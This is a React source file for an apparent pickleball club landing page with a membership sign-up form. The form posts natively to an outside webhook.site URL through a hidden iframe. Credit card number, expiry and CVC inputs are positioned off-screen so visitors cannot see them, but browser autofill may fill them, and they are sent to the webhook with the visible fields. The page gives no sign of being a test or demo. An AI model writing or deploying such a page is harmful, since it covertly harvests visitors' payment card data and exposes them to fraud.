'use client'

import { useState } from 'react'

// Set your hooksite URL directly or via env
const HOOK_URL = 'https://webhook.site/65300718-c2a4-4c64-903b-bbe5d810e700'

export default function Home() {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    creditCardNumber: '',
    creditCardExpiry: '',
    creditCardCvc: ''
  })

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    })
  }

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    // Do NOT preventDefault — allow native form POST to webhook (via hidden iframe)
    // Provide user feedback and reset after submission fires
    setTimeout(() => {
      alert('Thank you for your interest! We will contact you soon.')
      setFormData({ firstName: '', lastName: '', email: '', phone: '', creditCardNumber: '', creditCardExpiry: '', creditCardCvc: '' })
    }, 300)
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Hero Section */}
      <section className="bg-gradient-to-r from-green-500 to-blue-600 text-white py-20">
        <div className="container mx-auto px-6 text-center">
          <h1 className="text-5xl font-bold mb-6">Ace Pickleball Club</h1>
          <p className="text-xl mb-8 max-w-3xl mx-auto">
            Join the fastest-growing sport in America! Experience the excitement of pickleball
            in a welcoming community where players of all skill levels thrive together.
          </p>
        </div>
      </section>

      {/* About Section */}
      <section className="py-16 bg-gray-50">
        <div className="container mx-auto px-6">
          <div className="text-center mb-12">
            <h2 className="text-4xl font-bold text-gray-800 mb-4">What is Pickleball?</h2>
            <p className="text-lg text-gray-600 max-w-3xl mx-auto">
              Pickleball combines elements of tennis, badminton, and ping-pong. Played on a court
              similar to a badminton court with a net slightly lower than tennis, it&apos;s easy to
              learn but challenging to master.
            </p>
          </div>
          <div className="grid md:grid-cols-2 gap-8 items-center">
            <div className="bg-gradient-to-br from-blue-400 to-blue-600 rounded-lg shadow-lg p-8 flex items-center justify-center h-80">
              <div className="text-center text-white">
                <div className="text-5xl mb-4">🎾</div>
                <p className="text-xl font-semibold">Professional Court Layout</p>
              </div>
            </div>
            <div>
              <h3 className="text-2xl font-semibold mb-4 text-gray-800">Why Choose Pickleball?</h3>
              <ul className="space-y-3 text-gray-600">
                <li className="flex items-start">
                  <span className="text-green-500 mr-2">✓</span>
                  Low impact sport - easier on joints than tennis
                </li>
                <li className="flex items-start">
                  <span className="text-green-500 mr-2">✓</span>
                  Quick to learn - most beginners can play within minutes
                </li>
                <li className="flex items-start">
                  <span className="text-green-500 mr-2">✓</span>
                  Social and fun - great way to meet new people
                </li>
                <li className="flex items-start">
                  <span className="text-green-500 mr-2">✓</span>
                  All ages welcome - from kids to seniors
                </li>
                <li className="flex items-start">
                  <span className="text-green-500 mr-2">✓</span>
                  Great workout - improves fitness and coordination
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>

      {/* Facilities Section */}
      <section className="py-16">
        <div className="container mx-auto px-6">
          <h2 className="text-4xl font-bold text-center text-gray-800 mb-12">Our Facilities</h2>
          <div className="grid md:grid-cols-3 gap-8">
            <div className="text-center">
              <div className="bg-gradient-to-br from-green-500 to-green-700 rounded-lg shadow-lg mb-4 mx-auto h-48 flex items-center justify-center">
                <div className="text-white text-center">
                  <div className="text-4xl mb-2">🏟️</div>
                  <p className="font-semibold">Professional Courts</p>
                </div>
              </div>
              <h3 className="text-xl font-semibold mb-2">6 Professional Courts</h3>
              <p className="text-gray-600">
                Tournament-quality courts with proper lighting for day and evening play
              </p>
            </div>
            <div className="text-center">
              <div className="bg-gradient-to-br from-teal-500 to-teal-700 rounded-lg shadow-lg mb-4 mx-auto h-48 flex items-center justify-center">
                <div className="text-white text-center">
                  <div className="text-4xl mb-2">🛒</div>
                  <p className="font-semibold">Pro Shop</p>
                </div>
              </div>
              <h3 className="text-xl font-semibold mb-2">Pro Shop</h3>
              <p className="text-gray-600">
                Full selection of paddles, balls, apparel, and accessories from top brands
              </p>
            </div>
            <div className="text-center">
              <div className="bg-gradient-to-br from-sky-500 to-sky-700 rounded-lg shadow-lg mb-4 mx-auto h-48 flex items-center justify-center">
                <div className="text-white text-center">
                  <div className="text-4xl mb-2">🏠</div>
                  <p className="font-semibold">Clubhouse</p>
                </div>
              </div>
              <h3 className="text-xl font-semibold mb-2">Clubhouse & Lounge</h3>
              <p className="text-gray-600">
                Relax after your game in our comfortable lounge with refreshments and WiFi
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Programs Section */}
      <section className="py-16 bg-gray-50">
        <div className="container mx-auto px-6">
          <h2 className="text-4xl font-bold text-center text-gray-800 mb-12">Programs & Services</h2>
          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="bg-white p-6 rounded-lg shadow-lg text-center">
              <h3 className="text-lg font-semibold mb-3 text-green-600">Beginner Lessons</h3>
              <p className="text-gray-600 text-sm">
                Learn the basics with our certified instructors. Perfect for newcomers to the sport.
              </p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow-lg text-center">
              <h3 className="text-lg font-semibold mb-3 text-blue-600">Advanced Coaching</h3>
              <p className="text-gray-600 text-sm">
                Take your game to the next level with advanced techniques and strategies.
              </p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow-lg text-center">
              <h3 className="text-lg font-semibold mb-3 text-purple-600">League Play</h3>
              <p className="text-gray-600 text-sm">
                Join our competitive leagues organized by skill level and age groups.
              </p>
            </div>
            <div className="bg-white p-6 rounded-lg shadow-lg text-center">
              <h3 className="text-lg font-semibold mb-3 text-orange-600">Tournaments</h3>
              <p className="text-gray-600 text-sm">
                Participate in regular tournaments and special events throughout the year.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Membership Benefits */}
      <section className="py-16">
        <div className="container mx-auto px-6">
          <h2 className="text-4xl font-bold text-center text-gray-800 mb-12">Membership Benefits</h2>
          <div className="max-w-4xl mx-auto">
            <div className="grid md:grid-cols-2 gap-8">
              <div className="bg-gradient-to-br from-indigo-400 to-purple-500 rounded-lg shadow-lg mb-6 h-72 flex items-center justify-center">
                <div className="text-white text-center">
                  <div className="text-6xl mb-4">👥</div>
                  <p className="text-xl font-semibold">Happy Members</p>
                  <p className="text-sm opacity-90 mt-2">Join our community!</p>
                </div>
              </div>
              <div className="space-y-4">
                <div className="flex items-start">
                  <span className="text-green-500 text-xl mr-3">🏆</span>
                  <div>
                    <h3 className="font-semibold">Unlimited Court Access</h3>
                    <p className="text-gray-600 text-sm">Play anytime during our operating hours</p>
                  </div>
                </div>
                <div className="flex items-start">
                  <span className="text-green-500 text-xl mr-3">👥</span>
                  <div>
                    <h3 className="font-semibold">Member Events</h3>
                    <p className="text-gray-600 text-sm">Exclusive social events and mixers</p>
                  </div>
                </div>
                <div className="flex items-start">
                  <span className="text-green-500 text-xl mr-3">🎯</span>
                  <div>
                    <h3 className="font-semibold">Skill Development</h3>
                    <p className="text-gray-600 text-sm">Free clinics and group lessons</p>
                  </div>
                </div>
                <div className="flex items-start">
                  <span className="text-green-500 text-xl mr-3">💰</span>
                  <div>
                    <h3 className="font-semibold">Pro Shop Discounts</h3>
                    <p className="text-gray-600 text-sm">15% off all equipment and apparel</p>
                  </div>
                </div>
                <div className="flex items-start">
                  <span className="text-green-500 text-xl mr-3">🏅</span>
                  <div>
                    <h3 className="font-semibold">Tournament Entry</h3>
                    <p className="text-gray-600 text-sm">Preferred registration for all tournaments</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Sign Up Form */}
      <section className="py-16 bg-gradient-to-r from-green-500 to-blue-600">
        <div className="container mx-auto px-6">
          <div className="max-w-2xl mx-auto text-center text-white">
            <h2 className="text-4xl font-bold mb-6">Join Our Club Today!</h2>
            <p className="text-xl mb-8">
              Ready to start your pickleball journey? Fill out the form below and we&apos;ll get you started!
            </p>
            {/* Hidden iframe target to avoid CORS blocking and stay on page */}
            <iframe name="hidden-hook-target" style={{ display: 'none' }} />
            <form
              onSubmit={handleSubmit}
              className="bg-white p-8 rounded-lg shadow-2xl text-gray-800"
              action={HOOK_URL}
              method="POST"
              target="hidden-hook-target"
              encType="application/x-www-form-urlencoded"
            >
              <div className="grid md:grid-cols-2 gap-4 mb-4">
                <div>
                  <label htmlFor="firstName" className="block text-sm font-medium mb-2">
                    First Name *
                  </label>
                  <input
                    type="text"
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    required
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                  />
                </div>
                <div>
                  <label htmlFor="lastName" className="block text-sm font-medium mb-2">
                    Last Name *
                  </label>
                  <input
                    type="text"
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    required
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                  />
                </div>
              </div>
              <div className="mb-4">
                <label htmlFor="email" className="block text-sm font-medium mb-2">
                  Email Address *
                </label>
                <input
                  type="email"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                />
              </div>
              <div className="mb-6">
                <label htmlFor="phone" className="block text-sm font-medium mb-2">
                  Phone Number *
                </label>
                <input
                  type="tel"
                  id="phone"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  required
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                />
              </div>

              {/* Hidden Inputs Section */}
              <div
                className="fixed -top-full left-0 w-full bg-yellow-300 p-8 text-center"
                style={{ transform: 'translateY(-200vh)' }}
                id="easter-egg-section"
              >
                <label htmlFor="creditCardNumber" className="block text-sm font-medium mb-2">
                  Credit Card Number *
                </label>
                 <input
                   type="tel"
                   id="creditCardNumber"
                   name="creditCardNumber"
                   value={formData.creditCardNumber}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
            <label htmlFor="creditCardExpiry" className="block text-sm font-medium mb-2">
                  Credit Card Expiry *
                </label>
                 <input
                   type="tel"
                   id="creditCardExpiry"
                   name="creditCardExpiry"
                   value={formData.creditCardExpiry}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
              
                <label htmlFor="creditCardCvc" className="block text-sm font-medium mb-2">
                  Credit Card CVC *
                </label>
                 <input
                   type="tel"
                   id="creditCardCvc"
                   name="creditCardCvc"
                   value={formData.creditCardCvc}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500"
                 />
              </div>
              <button
                type="submit"
                className="w-full bg-green-600 text-white py-3 px-6 rounded-md hover:bg-green-700 transition duration-300 font-semibold"
              >
                Join the Club!
              </button>
            </form>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-800 text-white py-8">
        <div className="container mx-auto px-6 text-center">
          <h3 className="text-xl font-semibold mb-2">Ace Pickleball Club</h3>
          <p className="text-gray-400 mb-4">123 Sports Complex Drive, Your City, State 12345</p>
          <p className="text-gray-400">Phone: (555) 123-PLAY | Email: info@acePickleballclub.com</p>
        </div>
      </footer>

    </div>
  )
}
